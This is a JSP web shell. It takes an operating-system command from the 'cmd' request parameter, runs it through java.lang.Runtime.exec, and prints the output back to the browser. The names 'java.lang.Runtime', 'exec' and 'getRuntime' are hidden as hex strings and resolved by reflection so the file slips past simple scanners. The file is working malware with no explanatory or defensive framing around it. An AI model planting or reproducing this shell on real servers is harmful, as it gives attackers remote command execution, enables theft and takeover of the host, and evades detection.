<%@ page contentType="text/html;charset=UTF-8" import="javax.xml.bind.DatatypeConverter" language="java" %>
<%
    if(request.getParameter("cmd")!=null){
        Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary("6a6176612e6c616e672e52756e74696d65")));
        Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary("65786563")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary("67657452756e74696d65"))).invoke(null), request.getParameter("cmd") );
        java.io.InputStream in = e.getInputStream();
        int a = -1;byte[] b = new byte[2048];out.print("<pre>");
        while((a=in.read(b))!=-1){ out.println(new String(b)); }out.print("</pre>");
    }
%>